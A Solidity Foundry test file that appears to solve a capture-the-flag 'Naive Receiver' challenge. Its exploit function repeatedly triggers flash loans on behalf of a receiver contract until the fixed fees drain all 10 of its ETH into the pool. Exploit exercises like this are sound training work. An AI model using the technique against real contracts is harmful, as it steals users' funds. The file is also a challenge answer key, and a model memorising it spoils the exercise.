// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "../../naive-receiver/NaiveReceiverLenderPool.sol";
import "../../naive-receiver/FlashLoanReceiver.sol";

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

contract NaiveReceiverTest is BaseTest {

    // Pool has 1000 ETH in balance
    uint ETHER_IN_POOL = 1000 ether;

    // Receiver has 10 ETH in balance
    uint ETHER_IN_RECEIVER = 10 ether;

    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    address payable attacker;

    constructor() {
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";

        preSetup(2, labels);
    }

    function setUp() public override {
        super.setUp();

        bool sent;

        attacker = users[0];

        // setup contracts
        pool = new NaiveReceiverLenderPool();
        (sent, ) = address(pool).call{value: ETHER_IN_POOL}("");
        require(sent, "ETHER_IN_POOL not sent to pool");

        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(pool.fixedFee(), 1 ether);

        
        receiver = new FlashLoanReceiver(payable(pool));
        (sent, ) = address(receiver).call{value: ETHER_IN_RECEIVER}("");
        require(sent, "ETHER_IN_RECEIVER not sent to receiver");


        assertEq(address(receiver).balance, ETHER_IN_RECEIVER);
    }

    
    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(attacker);
        uint256 flashFee = pool.fixedFee();
        while( true ) {
            uint256 flashAmount = address(receiver).balance - flashFee;
            pool.flashLoan(address(receiver), flashAmount);

            // we have consumed all the ETH from the poor receiver :(
            if( address(receiver).balance == 0 ) break;
        }
        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        assertEq(address(receiver).balance, 0);
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}
